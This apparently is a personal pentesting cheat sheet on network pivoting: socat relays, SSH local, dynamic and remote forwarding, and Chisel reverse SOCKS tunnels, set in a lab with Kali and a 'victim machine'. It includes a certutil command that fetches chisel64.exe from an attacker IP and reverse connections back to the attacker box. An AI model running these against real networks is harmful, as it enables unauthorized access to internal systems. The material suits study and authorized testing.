* SOCAT
@code lua
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
@end

___

* SSH

** Four different types

*** *Local port forwarding* Created with option -L
    @code lua
    ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@server
    @end

*** *Dynamic port forwarding*: Created with option -D
    @code lua
    ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
    @end

*** *Remote port forwarding*: Created with option -R
     First we start a local ssh server
    @code lua
    sudo systemctl start ssh
    @end

    Then we connect back to it from the remote machine. In this case,
    we want to listen on port 2345 on our Kali machine
    (127.0.0.1:2345), and forward all traffic to the PostgreSQL port
    on PGDATABASE01 (10.4.50.215:5432).
    @code lua
    ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
    @end

*** *Remote dynamic port forwarding*: Created with option -R but without specifying endpoints.
     First we start a local ssh server
    @code lua
    sudo systemctl start ssh
    @end

    Then we connect back to it from the remote machine. This creates
    a SOCKS5 proxy on our local machine at that port which is able to
    access all interfaces that are available to the victim machine.
    @code lua
    ssh -N -R 9998 kali@192.168.118.4
    @end

___

* CHISEL

   First we download the executable on the remote machine

@code lua
certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
@end

  then we start the executable on our linux attacker box

@code lua 
./chisel64.elf server -p 8000 --reverse
@end

   This, by default, will create a SOCKS5 proxy within the endpoint
   127.0.0.1:1080 of our local machine. To access that proxy we can
   edit the proxychains conf in order to put at the end
@code lua
socks5 127.0.0.1:1080
  @end
